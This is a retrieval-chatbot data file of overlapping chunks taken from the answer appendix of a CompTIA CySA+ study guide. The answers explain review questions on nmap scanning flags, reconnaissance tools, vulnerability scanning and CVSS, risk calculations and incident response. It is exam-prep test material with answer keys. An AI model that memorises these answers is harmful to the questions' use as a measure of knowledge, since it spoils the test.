wmap scanner is a web application scanner module for the Metasploit Framework that can scan for vulnerable web applications. The smb_login tool looks for SMB shares, not web applications. Angry IP Scanner is not integrated with Metasploit, and nmap is a port scanner, not a full web application vulnerability scanner. 2. C. Nmap’s operating system identification flag is –O and it enables OS detection. –A also enables OS identification and other features. –osscan with modifiers like –limit and –guess set specific OS identification features. –os and –id are not nmap flags. 3. B. Traceroute (or tracert on Windows systems) is a command-­line tool that uses ICMP to trace the route that a packet takes to a host. Whois and nslookup are domain tools, and routeview is not a command-­line tool. 496 Appendix ■ Answers to Review Questions 4. C. Zenmap is a graphical user interface for nmap that also supports graphical output, including visual maps of networks. Valerie can use Zenmap to control nmap and create the output she wants. Angry IP Scanner is a separate scanner and does not generate a visual map of networks—­instead, it provides lists. Wmap is a plug-­in for the Metasploit Framework and a stand-­alone tool that is a web application and service vulnerability testing tool, and nmap­gs was made up for this
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and nslookup are domain tools, and routeview is not a command-­line tool. 496 Appendix ■ Answers to Review Questions 4. C. Zenmap is a graphical user interface for nmap that also supports graphical output, including visual maps of networks. Valerie can use Zenmap to control nmap and create the output she wants. Angry IP Scanner is a separate scanner and does not generate a visual map of networks—­instead, it provides lists. Wmap is a plug-­in for the Metasploit Framework and a stand-­alone tool that is a web application and service vulnerability testing tool, and nmap­gs was made up for this question. 5. B. Along with the time to run the scan and time to live of packets sent, Susan will see the hostname, service ports, and operating system using the scan flags above. The -O flag attempts to identify the operating system, while the -­Pn flag skips pinging and scans all hosts in the network on their typically scanned ports. 6. C. Maltego calls its server-­based functions for information gathering “transforms.” 7. C. While you may not know the full list of Recon-­ng plug-­ins, Shodan is a well-­known search engine. Laura could leverage API access to Shodan to gather information from previously performed searches. Both the import utilities will require her to have data she has already gathered, and the Whois miner can be assumed to use Whois information rather than an existing search engine dataset. 8. D. Ports 80 and 443 are commonly associated with unencrypted (port 80) and TLS encrypted (port 443) web servers. There is not enough information to determine if this might be a Windows or Linux system, and these are not typical ports for a database server. 9. C. The time to live (TTL) provided as part of responses is used to evaluate the number of hops in a network, and thus to derive a best guess at network topology. While IP addresses can sometimes be related to network topology, they’re less likely to be directly associated with it. Hostnames and port numbers have no correlation to topology. 10. C. The -­Pn, or “no ping”, flag skips host discovery and performs a port scan. The -­sn flag skips the port scan after discovery, sL lists hosts by performing DNS lookups, and -­PS performs probes using a TCP SYN. 11. A. Some firewalls block ICMP ping but allow UDP or TCP pings. Jaime knows that choosing her ping protocol can help to bypass some firewalls. Angry IP Scanner is not a vulnerability scanner, and UDP pings are faster than TCP pings. 12. B. Hue knows that Maltego provides transforms that can identify hosts and IP addresses related to a domain and that it can then gather additional information using other OSINT transforms. Nmap and Angry IP Scanner are both active scanning tools, and traceroute won’t provide useful footprinting information given just a domain name. 13. A. To conduct a port scan, all Jack needs is an IP address, hostname, or IP range. 14. C. A packet
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	her ping protocol can help to bypass some firewalls. Angry IP Scanner is not a vulnerability scanner, and UDP pings are faster than TCP pings. 12. B. Hue knows that Maltego provides transforms that can identify hosts and IP addresses related to a domain and that it can then gather additional information using other OSINT transforms. Nmap and Angry IP Scanner are both active scanning tools, and traceroute won’t provide useful footprinting information given just a domain name. 13. A. To conduct a port scan, all Jack needs is an IP address, hostname, or IP range. 14. C. A packet capture can’t prevent external attacks, although it might capture evidence of one. Packet capture is often used to document work, including the time that a given scan or process occurred, and it can also be used to provide additional data for further analysis. 15. D. Operating system detection often uses TCP options support, IP ID sampling, and window size checks, as well as other indicators that create unique fingerprints for various operating systems. Service identification often leverages banners since TCP capabilities are not unique to a given service. Fuzzing is a code testing method, and application scanning is usually related to web application security. Chapter 6: Designing a Vulnerability Management Program 497 16. A. Recon-­ng is not a vulnerability scanner. It does help with OSINT activities like looking for sensitive files, conducting OSINT information gathering, and finding target IP addresses. Li knows that Recong-­ng is an OSINT-­focused tool and that vulnerability scanning is an active, rather than passive, information-­gathering effort. While Recon-­ng supports port scanning, it does not have a vulnerability scanner function. 17. D. Nmap support is built into MSF, allowing easy port scanning by simply calling nmap as you would normally from the command line. Angry IP Scanner is not built in, and both Recon-­ng and Maltego are separate tools with OSINT and information management capabilities. 18. C. Operating system fingerprinting relies in many cases on knowing what the TCP stack for a given operating system does when it sends responses. You can read more detail about the many ways nmap tests for and filters the data at https://nmap.org/book/ osdetect-­methods.html#osdetect-­probes. Sally knows that banners are provided at interactive logins or by services and that nmap uses network protocol data for OS detection. 19. C. Firewalls can prevent responses to port scanners, making systems essentially invisible to the scanner. A port scanner alone is not sufficient for asset discovery in many networks. Port scanners often have some limited vulnerability detection built in, often relying on version information or fingerprinting, but not detecting vulnerabilities does not prevent discovery. Port scanners make a best guess at services on a port based on information provided by the service. Port scanners do not typically cause problems for most modern applications and services but can under some circumstances. This shouldn’t stop a discovery port scan, though! 20. B. Recon-­ng is a Python-­based open source framework for open source intelligence gathering and web-­based reconnaissance. The
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	A port scanner alone is not sufficient for asset discovery in many networks. Port scanners often have some limited vulnerability detection built in, often relying on version information or fingerprinting, but not detecting vulnerabilities does not prevent discovery. Port scanners make a best guess at services on a port based on information provided by the service. Port scanners do not typically cause problems for most modern applications and services but can under some circumstances. This shouldn’t stop a discovery port scan, though! 20. B. Recon-­ng is a Python-­based open source framework for open source intelligence gathering and web-­based reconnaissance. The Metasploit Framework is a penetration testing and compromise tool with a multitude of other features, but it is not as well suited to information gathering as a core purpose. Nmap and the Angry IP Scanner are both port scanners. Chapter 6: Designing a Vulnerability Management Program 1. C. The Federal Information Security Management Act (FISMA) requires that federal agencies implement vulnerability management programs for federal information systems. The Health Insurance Portability and Accountability Act (HIPAA) regulates the ways that healthcare providers, insurance companies, and their business associates handle protected health (PHI) information. Similarly, the Gramm–Leach–Bliley Act (GLBA) governs how financial institutions handle customer financial records. The Family Educational Rights and Privacy Act (FERPA), which is not covered in this chapter or on the CySA+ exam, allows parents to access their children’s educational records. 2. D. ISO 27001 describes a standard approach for setting up an information security management system, while ISO 27002 goes into more detail on the specifics of information security controls. The Open Web Application Security Project (OWASP) provides advice and tools focused on web application security. The Center for Internet Security (CIS) produces a set of configuration benchmarks used to securely configure operating systems, applications, and devices. 498 Appendix ■ Answers to Review Questions 3. A. An asset inventory supplements automated tools with other information to detect systems present on a network. The asset inventory provides critical information for vulnerability scans. 4. D. PCI DSS requires that organizations conduct vulnerability scans on at least a quarterly basis, although many organizations choose to conduct scans on a much more frequent basis. 5. B. Nessus and OpenVAS are network vulnerability scanning tools, while Nikto is a web application vulnerability scanner. Snort is an intrusion detection system. 6. A. PCI DSS requires that organizations conduct vulnerability scans quarterly, which would have Bethany’s next regularly scheduled scan scheduled for June. However, the standard also requires scanning after any significant change in the payment card environment. This would include an upgrade to the point-­of-­sale system, so Bethany must complete a new compliance scan immediately. 7. D. Credentialed scans only require read-­only access to target servers. Renee should follow the principle of least privilege and limit the access available to the scanner. 8. C. Common Platform Enumeration (CPE) is an SCAP component that provides standardized nomenclature for product names and versions. 9. D. Internal scans completed for PCI DSS compliance purposes may be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	have Bethany’s next regularly scheduled scan scheduled for June. However, the standard also requires scanning after any significant change in the payment card environment. This would include an upgrade to the point-­of-­sale system, so Bethany must complete a new compliance scan immediately. 7. D. Credentialed scans only require read-­only access to target servers. Renee should follow the principle of least privilege and limit the access available to the scanner. 8. C. Common Platform Enumeration (CPE) is an SCAP component that provides standardized nomenclature for product names and versions. 9. D. Internal scans completed for PCI DSS compliance purposes may be conducted by any qualified individual. 10. C. The Federal Information Security Management Act (FISMA) requires that government agencies conduct vulnerability scans. HIPAA, which governs hospitals and doctors’ offices, does not include a vulnerability scanning requirement, nor does GLBA, which covers financial institutions. Banks may be required to conduct scans under PCI DSS, but this is a contractual obligation and not a statutory requirement. 11. A. All of these organizations provide security tools and advice. However, only the Open Web Application Security Project (OWASP) has a dedicated focus on the development of secure web applications. 12. B. The organization’s risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk-averse, it may choose to conduct scans more frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan. 13. D. Scan schedules are most often determined by the organization’s risk appetite, regulatory requirements, technical constraints, business constraints, and licensing limitations. Most scans are automated and do not require staff availability. 14. B. If Barry is able to limit the scope of his PCI DSS compliance efforts to the isolated network, then that is the only network that must be scanned for PCI DSS compliance purposes. 15. C. Ryan should first run his scan against a test environment to identify likely vulnerabilities and assess whether the scan itself might disrupt business activities. Chapter 7: Analyzing Vulnerability Scans 499 16. C. Although reporting and communication are an important part of vulnerability management, they are not included in the life cycle. The three life-­cycle phases are detection, remediation, and testing. 17. A. Continuous monitoring incorporates data from agent-­based approaches to vulnerability detection and reports security-­related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities. 18. A. The Zed Attack Proxy (ZAP) is a proxy server that may be used in web application penetration tests but it is not itself an automated vulnerability scanning tool. Nikto and Arachni are examples of dedicated web application vulnerability scanners. Burp Suite is a web proxy used in penetration testing. 19. A. The Common Vulnerability Scoring System (CVSS) provides a standardized approach for measuring and describing the severity of security vulnerabilities. Jessica could use this scoring system to prioritize issues raised by different source systems. 20. B. While any
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	providing the ability to analyze those changes for potential vulnerabilities. 18. A. The Zed Attack Proxy (ZAP) is a proxy server that may be used in web application penetration tests but it is not itself an automated vulnerability scanning tool. Nikto and Arachni are examples of dedicated web application vulnerability scanners. Burp Suite is a web proxy used in penetration testing. 19. A. The Common Vulnerability Scoring System (CVSS) provides a standardized approach for measuring and describing the severity of security vulnerabilities. Jessica could use this scoring system to prioritize issues raised by different source systems. 20. B. While any qualified individual may conduct internal compliance scans, PCI DSS requires the use of a scanning vendor approved by the PCI SSC for external compliance scans. Chapter 7: Analyzing Vulnerability Scans 1. B. Although the network can support any of these protocols, internal IP disclosure vulnerabilities occur when a network uses Network Address Translation (NAT) to map public and private IP addresses but a server inadvertently discloses its private IP address to remote systems. 2. C. The privileges required (PR) metric indicates the type of account access the attacker must have. 3. C. An attack complexity of “low” indicates that exploiting the vulnerability does not require any specialized conditions. 4. D. A value of High (H) for an impact metric indicates the potential for complete loss of confidentiality, integrity, and/or availability. 5. C. CVSS 3.1 is the most recent version of the standard as of the time this book was published in 2023. 6. B. The CVSS exploitability score is computed using the attack vector (AV), attack complexity (AC), privileges required (PR), and user interaction (UI) metrics. Vulnerability age is not an included metric. 7. B. Vulnerabilities with CVSS base scores between 4.0 and 6.9 fit into the medium risk category. 500 Appendix ■ Answers to Review Questions 8. A. A false positive error occurs when the vulnerability scanner reports a vulnerability that does not actually exist. 9. B. It is unlikely that a database table would contain information relevant to assessing a vulnerability scan report. Logs, SIEM reports, and configuration management systems are much more likely to contain relevant information. 10. A. Microsoft discontinued support for Windows Server 2008 R2 in 2020, and it is highly likely that the operating system contains unpatchable vulnerabilities. 11. D. Buffer overflow attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program’s use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. 12. B. In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW. This vulnerability, present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems. 13. D. Telnet is an insecure protocol that does not make use of encryption. The other protocols mentioned are all considered secure.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	into an area of memory than is allocated for that program’s use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. 12. B. In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW. This vulnerability, present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems. 13. D. Telnet is an insecure protocol that does not make use of encryption. The other protocols mentioned are all considered secure. 14. D. TLS 1.3 is a secure transport protocol that supports web traffic. The other protocols listed all have flaws that render them insecure and unsuitable for use. 15. B. Digital certificates are intended to provide public encryption keys, and this would not cause an error. The other circumstances are all causes for concern and would trigger an alert during a vulnerability scan. 16. C. XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. 17. C. This URL contains the address of a local file passed to a web application as an argument. It is most likely a local file inclusion (LFI) exploit, attempting to execute a malicious file that the testers previously uploaded to the server. 18. B. Intrusion detection systems (IDSs) are a security control used to detect network or host attacks. The Internet of Things (IoT), supervisory control and data acquisition (SCADA) systems, and industrial control systems (ICSs) are all associated with connecting physical world objects to a network. 19. D. In a cross-­site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party. 20. A. In a SQL injection attack, the attacker seeks to use a web application to gain access to an underlying database. Semicolons and apostrophes are characteristic of these attacks. Chapter 8: Responding to Vulnerabilities 501 Chapter 8: Responding to Vulnerabilities 1. C. By applying the patch, Jen has removed the vulnerability from her server. This also has the effect of eliminating this particular risk. Jen cannot control the external threat of an attacker attempting to gain access to her server. 2. C. Installing a web application firewall reduces the probability that an attack will reach the web server. Vulnerabilities may still exist in the web application and the threat of an external attack is unchanged. The impact of a successful SQL injection attack is also unchanged by a web application firewall. 3. C. The asset at risk in this case is the customer database. Losing control of the database would result in a $500,000 fine, so the asset value (AV)
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	eliminating this particular risk. Jen cannot control the external threat of an attacker attempting to gain access to her server. 2. C. Installing a web application firewall reduces the probability that an attack will reach the web server. Vulnerabilities may still exist in the web application and the threat of an external attack is unchanged. The impact of a successful SQL injection attack is also unchanged by a web application firewall. 3. C. The asset at risk in this case is the customer database. Losing control of the database would result in a $500,000 fine, so the asset value (AV) is $500,000. 4. D. The attack would result in the total loss of customer data stored in the database, making the exposure factor (EF) 100%. 5. C. We compute the single loss expectancy (SLE) by multiplying the asset value (AV) ($500,000) and the exposure factor (EF) (100%) to get an SLE of $500,000. 6. A. Aziz’s threat intelligence research determined that the threat has a 5% likelihood of occurrence each year. This is an ARO of 0.05. 7. B. We compute the annualized loss expectancy (ALE) by multiplying the SLE ($500,000) and the ARO (0.05) to get an ALE of $25,000. 8. C. Installing new controls or upgrading existing controls is an effort to reduce the probability or magnitude of a risk. This is an example of a risk mitigation activity. 9. B. Changing business processes or activities to eliminate a risk is an example of risk avoidance. 10. D. Insurance policies use a risk transference strategy by shifting some or all of the financial risk from the organization to an insurance company. 11. A. When an organization decides to take no further action to address remaining risk, they are choosing a strategy of risk acceptance. 12. D. Bug bounty programs provide a formal process that allows organizations to open their systems to inspection by security researchers in a controlled environment that encourages attackers to report vulnerabilities in a responsible fashion. Edge discovery scanning identifies any systems or devices with public exposure by scanning IP addresses belonging to the organization. Passive discovery techniques monitor inbound and outbound traffic to detect devices that did not appear during other discovery scans. Security controls testing verifies that the organization’s array of security controls are functioning properly. 502 Appendix ■ Answers to Review Questions 13. B. Input validation helps prevent a wide range of problems, from cross-­site scripting (XSS) to SQL injection attacks. Secure session management ensures that attackers cannot hijack user sessions or that session issues don’t cause confusion among users. Organizations that offer technology services to customers may define service level objectives (SLOs) that set formal expectations for service availability, data preservation, and other key requirements. Many organizations choose to consolidate many changes in a single period of time known as a maintenance window. Maintenance windows typically occur on evenings and weekends or during other periods of time where business activity is low. 14. A. The Immunity debugger is designed specifically to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	problems, from cross-­site scripting (XSS) to SQL injection attacks. Secure session management ensures that attackers cannot hijack user sessions or that session issues don’t cause confusion among users. Organizations that offer technology services to customers may define service level objectives (SLOs) that set formal expectations for service availability, data preservation, and other key requirements. Many organizations choose to consolidate many changes in a single period of time known as a maintenance window. Maintenance windows typically occur on evenings and weekends or during other periods of time where business activity is low. 14. A. The Immunity debugger is designed specifically to support penetration testing and the reverse engineering of malware. GNU debugger (GDB) is a widely used open source debugger for Linux that works with a variety of programming languages. The software development life cycle (SDLC) describes the steps in a model for software development throughout its life. Parameterized queries prevent SQL injection attacks by precompiling SQL queries so that new code may not be inserted when the query is executed. 15. B. Attack vectors, or the means by which an attacker can gain access to their target can include things like USB key drops. You may be tempted to answer this question with adversary capability, but remember the definition: the resources, intent, or ability of the likely threat actor. Capability here doesn’t mean what they can do, but their ability to do so. The attack surface might include the organization’s parking lot in this example, but this is not an example of an attack surface, and there was no probability assessment included in this problem. 16. A. Behavioral assessments are very useful when you are attempting to identify insider threats. Since insider threats are often hard to distinguish from normal behavior, context of the actions performed, such as afterhours logins, misuse of credentials, logins from abnormal locations or in abnormal patterns, and other behavioral indicators, are often used. 17. D. STRIDE, PASTA, and LIDDUN are all examples of threat classification tools. LIDDUN focuses on threats to privacy, STRIDE is a Microsoft tool, and PASTA is an attacker-­centric threat modeling tool. 18. B. Dynamic analysis techniques actually execute the code during the testing process. Static code analysis tools and techniques analyze the structure and content of code without executing the code itself. Compilation is the process of transforming source code into an executable and decompilation attempts to reverse that process. Neither compilation nor decompilation executes the code. 19. B. Adam is conducting static code analysis by reviewing the source code. Dynamic code analysis requires running the program, and both mutation testing and fuzzing are types of dynamic analysis. Chapter 9: Building an Incident Response Program 503 20. C. Tiffany is stress-­testing the application. Stress testing intentionally goes beyond the application’s normal limits to see how it responds to extreme loads or other abnormal conditions beyond its normal capacity. Unit testing tests individual components of an applications, while regression testing is done to ensure that new versions don’t introduce old bugs. Fagan
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	compilation nor decompilation executes the code. 19. B. Adam is conducting static code analysis by reviewing the source code. Dynamic code analysis requires running the program, and both mutation testing and fuzzing are types of dynamic analysis. Chapter 9: Building an Incident Response Program 503 20. C. Tiffany is stress-­testing the application. Stress testing intentionally goes beyond the application’s normal limits to see how it responds to extreme loads or other abnormal conditions beyond its normal capacity. Unit testing tests individual components of an applications, while regression testing is done to ensure that new versions don’t introduce old bugs. Fagan testing is a formal method of code inspection. Chapter 9: Building an Incident Response Program 1. D. A former employee crashing a server is an example of a computer security incident because it is an actual violation of the availability of that system. A user accessing a secure file and an administrator changing file permission settings are examples of security events but are not security incidents. An intruder breaking into a building may be a security event, but it is not necessarily a computer security event unless they perform some action affecting a computer system. 2. A. Organizations should build solid, defense-­in-­depth approaches to cybersecurity during the preparation phase of the incident response process. The controls built during this phase serve to reduce the likelihood and impact of future incidents. 3. C. A security information and event management (SIEM) system correlates log entries from multiple sources and attempts to identify potential security incidents. 4. C. The definition of a medium functional impact is that the organization has lost the ability to provide a critical service to a subset of system users. That accurately describes the situation that Ben finds himself in. Assigning a low functional impact is only done when the organization can provide all critical services to all users at diminished efficiency. Assigning a high functional impact is only done if a critical service is not available to all users. 5. C. The containment protocols contained in the containment, eradication, and recovery phases are designed to limit the damage caused by an ongoing security incident. 6. C. The Kill Chain includes actions outside the defended network which many defenders cannot take action on, resulting in one of the common criticisms of the model. Other criticisms include the focus on a traditional perimeter and on antimalware-­based techniques, as well as a lack of focus on insider threats. 7. C. In a proprietary breach, unclassified proprietary information is accessed or exfiltrated. Protected critical infrastructure information (PCII) is an example of unclassified proprietary information. 504 Appendix ■ Answers to Review Questions 8. A. The Network Time Protocol (NTP) provides a common source of time information that allows the synchronizing of clocks throughout an enterprise. 9. A. An organization’s incident response policy should contain a clear description of the authority assigned to the CSIRT while responding to an active security incident. 10. D. A web attack is an attack executed from a website
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a lack of focus on insider threats. 7. C. In a proprietary breach, unclassified proprietary information is accessed or exfiltrated. Protected critical infrastructure information (PCII) is an example of unclassified proprietary information. 504 Appendix ■ Answers to Review Questions 8. A. The Network Time Protocol (NTP) provides a common source of time information that allows the synchronizing of clocks throughout an enterprise. 9. A. An organization’s incident response policy should contain a clear description of the authority assigned to the CSIRT while responding to an active security incident. 10. D. A web attack is an attack executed from a website or web-­based application—­for example, a cross-­site scripting attack used to steal credentials or redirect to a site that exploits a browser vulnerability and installs malware. 11. C. The installation phase of the Cyber Kill Chain focuses on providing persistent backdoor access for attackers. Delivery occurs when the tool is put into action either directly or indirectly, whereas exploitation occurs when a vulnerability is exploited. Command-and-Control (C2) uses two-­way communications to provide continued remote control. 12. A. The incident response policy provides the CSIRT with the authority needed to do their job. Therefore, it should be approved by the highest possible level of authority within the organization, preferably the CEO. 13. A. Detection of a potential incident occurs during the detection and analysis phase of incident response. The other activities listed are all objectives of the containment, eradication, and recovery phase. 14. C. Extended recoverability effort occurs when the time to recovery is unpredictable. In those cases, additional resources and outside help are typically needed. 15. D. An attrition attack employs brute-­force methods to compromise, degrade, or destroy systems, networks, or services—­for example, a DDoS attack intended to impair or deny access to a service or application or a brute-­force attack against an authentication mechanism. 16. C. Lessons learned sessions are most effective when facilitated by an independent party who was not involved in the incident response effort. 17. D. Procedures for rebuilding systems are highly technical and would normally be included in a playbook or procedure document rather than an incident response policy. 18. B. An impersonation attack involves the replacement of something benign with something malicious—­for example, spoofing, on-­path (man-­in-­the-­middle) attacks, rogue wireless access points, and SQL injection attacks all involve impersonation. 19. C. Incident response playbooks contain detailed, step-­by-­step instructions that guide the early response to a cybersecurity incident. Organizations typically have playbooks prepared for high-­severity and frequently occurring incident types. 20. A. The event described in this scenario would not qualify as a security incident with measurable information impact. Although the laptop did contain information that might cause a privacy breach, that breach was avoided by the use of encryption to protect the contents of the laptop. Chapter 10: Incident Detection and Analysis 505 Chapter 10: Incident Detection and Analysis 1. C. Susan needs to track the chain of custody for the evidence and should ensure that a proper chain of custody is maintained. This is especially
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	incident. Organizations typically have playbooks prepared for high-­severity and frequently occurring incident types. 20. A. The event described in this scenario would not qualify as a security incident with measurable information impact. Although the laptop did contain information that might cause a privacy breach, that breach was avoided by the use of encryption to protect the contents of the laptop. Chapter 10: Incident Detection and Analysis 505 Chapter 10: Incident Detection and Analysis 1. C. Susan needs to track the chain of custody for the evidence and should ensure that a proper chain of custody is maintained. This is especially important when dealing with data that may become part of legal proceedings. Forensic hashes are typically generated as part of forensic processes to ensure that the original and copies of forensic data match, but a hash alone does not provide chain-­of-­custody tracking. Legal holds require organizations to preserve data but don’t track chain of custody, and IoC ratings are unrelated to this question. 2. C. Hui knows that she needs to preserve the logs per the legal hold notice and will need to identify a method to preserve the logs while maintaining operations for her organization. Failing to do so can have significant legal repercussions. 3. A. Hashes are used to validate drive images and other forensic artifacts. Comparing a hash of the original and the image is commonly used to ensure that they match. None of the other options will validate a drive image, and encrypting a drive will modify it, spoiling the evidence. 4. B. A baseline for traffic patterns and levels would allow Kathleen to determine if the traffic was typical or if something unusual was going on. Heuristics focus on behaviors, and Kathleen wants to see if traffic levels are different, not behaviors. Protocol analysis looks at whether there is an unusual protocol or data, and network flow logs are useful for determining which systems are sending traffic to where and via what protocol. 5. B. Open feed data can vary in quality and reliability. That means Renee will have to put processes in place to assess the quality and reliability of the IoC information she is receiving. An open feed implies that it is free. Open feeds are generally active, and IoC detail levels vary as IoCs are created and updated, regardless of the type of feed. 6. C. Active monitoring is focused on reaching out to gather data using tools like ping and iPerf. Passive monitoring using protocol analyzers collects network traffic and router-­based monitoring using SNMP, and flows gather data by receiving or collecting logged information. 7. C. System images are not typically part of an IOC. Hashes of malicious software may be, as well as IP addresses, hostnames, domains, and behavior-­based information, among other common details. 8. C. Log analysis, flow monitoring, and deploying an IPS are all appropriate solutions to help detect denial-­of-­service attacks. iPerf is a performance testing tool used to establish the maximum bandwidth available on a network connection.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	out to gather data using tools like ping and iPerf. Passive monitoring using protocol analyzers collects network traffic and router-­based monitoring using SNMP, and flows gather data by receiving or collecting logged information. 7. C. System images are not typically part of an IOC. Hashes of malicious software may be, as well as IP addresses, hostnames, domains, and behavior-­based information, among other common details. 8. C. Log analysis, flow monitoring, and deploying an IPS are all appropriate solutions to help detect denial-­of-­service attacks. iPerf is a performance testing tool used to establish the maximum bandwidth available on a network connection. 9. C. While there could be other issues, a recurring scheduled task is most likely to be set as a cron job, and Sameer should start his search there. The Task Scheduler is a Windows tool, system logs may or may not contain information about the process, and searching user directories would not provide indications of what process was starting at a given time. 506 Appendix ■ Answers to Review Questions 10. B. Reviewing why the alert occurred is Jim's first step. IoCs in isolation may not indicate a compromise or attack, so validating the alert is an important first step. shutting down a system due to an alert could cause an outage or prevent forensic investigation. There is nothing in question to indicate that this is a network-based attack that will have been logged, and port scans are also not indicated by the question. 11. D. The behavior described with a significant increase in traffic from many systems all over the world is most likely a distributed denial-­of-­service attack if it is malicious. Mark’s challenge will be in determining if it is an attack or if some other event has occurred that is driving traffic to his website—­a post that goes viral can be difficult to differentiate from an attack in some cases! 12. A. Valentine knows that unauthorized access often involves the creation of unauthorized user accounts and authentication events that allowed access to the system. System logs contain system events, but not authentication or user creation information. Application logs track application events and also typically won’t show this type of information. 13. C. A series of attempted logins from the remote system with the same username but different passwords is a common indicator of a brute-­force attack. While more sophisticated attackers will use multiple remote systems and will spread attempts over time, a simple brute-­force attack will appear exactly like this. Sayed can verify this by checking in with the administrator whose username is being used. 14. C. The most likely answer is that the link has failed. Incorrectly set sampling rates will not provide a good view of traffic, and a DDoS attack is more likely to show large amounts of traffic. SNMP is a monitoring tool and would not result in flow data changing. 15. B. System logging is typically handled separately from application logging. Up/down, performance, transactional logs, and service logging are all common
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	will spread attempts over time, a simple brute-­force attack will appear exactly like this. Sayed can verify this by checking in with the administrator whose username is being used. 14. C. The most likely answer is that the link has failed. Incorrectly set sampling rates will not provide a good view of traffic, and a DDoS attack is more likely to show large amounts of traffic. SNMP is a monitoring tool and would not result in flow data changing. 15. B. System logging is typically handled separately from application logging. Up/down, performance, transactional logs, and service logging are all common forms of monitoring used to ensure applications are performing correctly. 16. A. Actions performed more quickly than a typical user would perform them can be an indicator of bot-­like behavior. If the user performing the actions does not typically run scripts or connect to multiple machines, Greg may want to investigate more deeply, including checking logs on the remote systems to see what authentication was attempted. SSH connections alone are not indicators of port scanning, escalation of privilege, or denial-­of-­service attacks. 17. C. An attacker is likely to attempt to gather information from the entire database, meaning that cached hits will not make up the full volume of queries. Thus, disk reads from a database may be a more important indicator of compromise than an increase in cached hits that may simply be more typical usage. 18. C. Valerie is specifically looking for network-­related IoCs, and system memory consumption is a host-­or system-­related IoC, not a network-­related IoC. 19. C. The first step in Alex’s process should be to identify where the files that are filling the drive are located and what they are. A simple search can help with this by sorting by large directories and files. Windows does not have a filesystem log that would record this, and Chapter 11: Containment, Eradication, and Recovery 507 security logs are focused on security events, not filesystem information. Searching for files that have changed requires a tool that tracks changes, which is not part of a default Windows installation. 20. B. Joseph has created a user behavior baseline, which will allow him to see if there are exceptions to the normal behaviors and commands that users run. Pattern matching, fingerprinting, and user modeling are not terms used to describe this process. Chapter 11: Containment, Eradication, and Recovery 1. A. The Containment, Eradication, and Recovery phase of incident response includes active undertakings designed to minimize the damage caused by the incident and restore normal operations as quickly as possible. 2. C. NIST recommends using six criteria to evaluate a containment strategy: the potential damage to resources, the need for evidence preservation, service availability, time and resources required (including cost), effectiveness of the strategy, and duration of the solution. 3. C. In a segmentation approach, the suspect system is placed on a separate network where it has very limited access to other networked resources. 4. B. In the isolation strategy, the quarantine network
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Eradication, and Recovery phase of incident response includes active undertakings designed to minimize the damage caused by the incident and restore normal operations as quickly as possible. 2. C. NIST recommends using six criteria to evaluate a containment strategy: the potential damage to resources, the need for evidence preservation, service availability, time and resources required (including cost), effectiveness of the strategy, and duration of the solution. 3. C. In a segmentation approach, the suspect system is placed on a separate network where it has very limited access to other networked resources. 4. B. In the isolation strategy, the quarantine network is directly connected to the Internet or restricted severely by firewall rules so that the attacker may continue to control it but not gain access to any other networked resources. 5. D. In the removal approach, Alice keeps the systems running for forensic purposes but completely cuts off their access to or from other networks, including the Internet. 6. A. Sandboxes are isolation tools used to contain attackers within an environment where they believe they are conducting an attack but, in reality, are operating in a benign environment. 7. C. Tamara’s first priority should be containing the attack. This will prevent it from spreading to other systems and also potentially stop the exfiltration of sensitive information. Only after containing the attack should Tamara move on to eradication and recovery activities. Identifying the source of the attack should be a low priority. 8. A. During an incident investigation, the team may encounter new indicators of compromise (IOCs) based on the tools, techniques, and tactics used by attackers. As part of the lessons learned review, the team should clearly identify any new IOCs and make recommendations for updating the organization’s security monitoring program to include those IOCs. This will reduce the likelihood of a similar incident escaping attention in the future. Scope, impact, and reimaging should be considered during containment, eradication, and recovery. 9. C. Understanding the root cause of an attack is critical to the incident recovery effort. Analysts should examine all available information to help reconstruct the attacker’s actions. This information is crucial to remediating security controls and preventing future similar attacks. 508 Appendix ■ Answers to Review Questions 10. C. Lynda should consult the flowchart that appears in Figure 11.7. Following that chart, the appropriate disposition for media that contains high security risk information and will be reused within the organization is to purge it. 11. B. New firewall rules, if required, would be implemented during the eradication and recovery phase. The validation phase includes verifying accounts and permissions, verifying that logging is working properly, and conducting vulnerability scans. 12. D. The primary purpose of eradication is to remove any of the artifacts of the incident that may remain on the organization’s network. This may include the removal of any malicious code from the network, the sanitization of compromised media, and the securing of compromised user accounts. 13. B. There are many potential uses for written incident reports. First,
